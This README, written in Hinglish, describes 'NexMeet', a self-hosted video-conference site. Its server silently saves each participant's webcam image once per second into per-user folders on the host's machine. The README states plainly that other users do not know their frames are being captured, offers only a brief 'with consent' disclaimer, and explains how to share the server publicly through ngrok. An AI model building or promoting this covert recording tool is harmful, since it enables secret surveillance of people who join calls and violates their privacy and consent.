# 🎥 NexMeet — Video Conference with Frame Capture

Zoom/Meet jaisi website jisme:
- Multiple users video conferencing kar sakte hain
- Server (tera device) har user ka screenshot har second save karta hai
- Captures `./captures/` folder mein save hote hain

---

## ⚡ Setup (VS Code Terminal)

### 1. Dependencies install karo
```bash
cd nexmeet-video-conference
npm install
```

### 2. Server start karo
```bash
node server.js
```

### 3. Browser mein kholo
```
http://localhost:3000
```

---

## 📸 Captures kahan milenge?

```
nexmeet-video-conference/
└── captures/
    ├── Rahul_abc123/
    │   ├── frame_2024-01-15T10-30-00.jpg
    │   ├── frame_2024-01-15T10-30-01.jpg
    │   └── ...
    └── Priya_def456/
        └── ...
```

Har user ka apna folder banta hai. Har second ek photo.

---

## 🌐 Friends ko kaise invite karo?

### Local Network (same WiFi):
1. Apna IP dhundo: `ipconfig` (Windows) ya `ifconfig` (Mac/Linux)
2. Friends ko do: `http://192.168.x.x:3000`
3. Same Room ID share karo

### Internet pe (ngrok se):
```bash
# ngrok install karo: https://ngrok.com
ngrok http 3000
# Milega: https://xxxx.ngrok.io — yeh share karo!
```

---

## 🛠️ Features

- ✅ WebRTC peer-to-peer video/audio
- ✅ Multiple participants
- ✅ Mic/Camera toggle
- ✅ Server side frame capture (har second)
- ✅ Captures sirf SERVER (teri machine) pe save hote hain
- ✅ Room ID system — alag rooms
- ✅ Share room link button

---

## ⚠️ Note

Yeh server teri machine pe run hota hai. Dusre users ko pata nahi lagta ki unke frames capture ho rahe hain. Use responsibly — only for personal/private use with consent.
